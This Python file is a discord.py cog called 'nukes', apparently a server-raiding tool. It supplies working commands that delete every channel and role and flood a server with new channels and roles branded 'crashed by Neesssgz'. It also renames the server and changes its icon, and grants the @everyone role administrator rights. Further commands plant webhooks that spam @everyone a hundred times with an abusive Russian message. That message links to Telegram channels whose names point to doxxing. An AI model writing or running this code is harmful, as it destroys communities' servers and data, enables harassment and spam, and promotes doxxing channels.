import os

try:
    import discord
except: os.system('pip install discord')

from discord.ext import commands

try:
    import colorama
except: os.system('pip install colorama')

from colorama import Fore, init

try:
    import requests
except: os.system('pip install requests')

try:
    import string
except:
    os.system("pip install string")
try:
    import random
except:
    os.system("pip install random")

init()

class nukes(commands.Cog):
    def __init__(self, client):
        self.client = client
        
        
    @commands.command()
    async def crash(self, ctx):
        with open('neesssgz.png', 'rb') as r:
            ava = r.read()
        await ctx.guild.edit(name='Crashed By Neesssgz', icon=ava)
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except: pass
                 
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except: pass
                
        for _ in range(50):
            await ctx.guild.create_text_channel(name='crashed-by-neesssgz')
            
        for _ in range(50):
                await ctx.guild.create_role(name='Crashed By Neesssgs')
                
    @commands.command()
    async def rename_server(self, ctx):
        with open('neesssgz.png', 'rb') as r:
            ava = r.read()
        await ctx.guild.edit(name='Crashed By Neesssgz', icon=ava)
            
    @commands.command()
    async def channels(self, ctx):
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except: pass
                
        for _ in range(50):
            await ctx.guild.create_text_channel(name='crashed-by-neesssgz')
                
    @commands.command()
    async def roles(self, ctx):
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except: pass
                
        for _ in range(50):
                await ctx.guild.create_role(name='Crashed By Neesssgz')
                
    @commands.command()
    async def del_channels(self, ctx):
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except: pass
            
    @commands.command()
    async def del_roles(self, ctx):
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except: pass
            
    @commands.command()
    async def spam_channels(self, ctx):
        for _ in range(50):
            await ctx.guild.create_text_channel(name='crashed-by-neesssgz')
            
    @commands.command()
    async def spam_roles(self, ctx):
        for _ in range(50):
            await ctx.guild.create_role(name='Crashed By Neesssgz')
            
    @commands.command()
    async def antilavan(self, ctx):
        with open('neesssgz.png', 'rb') as r:
            ava = r.read()
        await ctx.guild.edit(icon=ava)
        for channel in ctx.guild.channels:
            try:
                await channel.edit(name='crashed-by-neesssgz')
            except: pass
            
        for role in ctx.guild.roles:
            try:
                await role.edit(name='Server crashed by Neesssgz')
            except: pass
            
        for channel in ctx.guild.text_channels:
            try:
                await channel.create_webhook(name='Crashed by Neesssgz')
            except: pass
            
        for _ in range(100):
            for ch in ctx.guild.text_channels:
                for web in await ch.webhooks():
                    try:
                        await web.send('''
@everyone
данный сервер выебан селф ботом от Neesssgz.
все участники вашей помойки переезжают сюда:
https://discord.gg/lavanbot
https://t.me/kracher223
https://t.me/russian_deanon
https://t.me/russiandeanons
https://t.me/webdeanon''')
                    except: pass
                    
    @commands.command()
    async def rename_channels(self, ctx):
        for channel in ctx.guild.channels:
            try:
                await channel.edit(name='crashed-by-neesssgz')
            except: pass
            
    @commands.command()
    async def rename_roles(self, ctx):
        for role in ctx.guild.roles:
            try:
                await role.edit(name='Server crashed by Neesssgz')
            except: pass
            
    @commands.command()
    async def create_channels(self, ctx, arg="text", count: int=50, *, name='crashed-by-neesssgz'):
        if arg == "text":
            for _ in range(count):
                await ctx.guild.create_text_channel(name=name)
        elif arg == "voice":
            for _ in range(count):
                await ctx.guild.create_voice_channel(name=name)
        else:
            await ctx.send("Не известный тип канала")
            
    @commands.command()
    async def create_roles(self, ctx, count: int=50, *, name='Server crashed by Neesssgz'):
        for _ in range(count):
            await ctx.guild.create_role(name=name)

    @commands.command()
    async def rand_channels(self, ctx, arg="text", count: int=50):
        if arg == "text":
            for _ in range(count):
                chn = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=20))
                await ctx.guild.create_text_channel(name=chn)
        elif arg == "voice":
            for _ in range(count):
                names = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=20))
                await ctx.guild.create_voice_channel(name=names)
        else:
            await ctx.send("Указан не верный тип канала")

    @commands.command()
    async def rand_roles(self, ctx, count: int=50):
        for _ in range(count):
            names = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=20))
            await ctx.guild.create_role(name=names)
          
    @commands.command()
    async def everyone_admin(self, ctx):
        for role in ctx.guild.roles:
            if 'everyone' in role.name:
                await role.edit(permissions=discord.Permissions(administrator=True))
              

def setup(client):
    client.add_cog(nukes(client))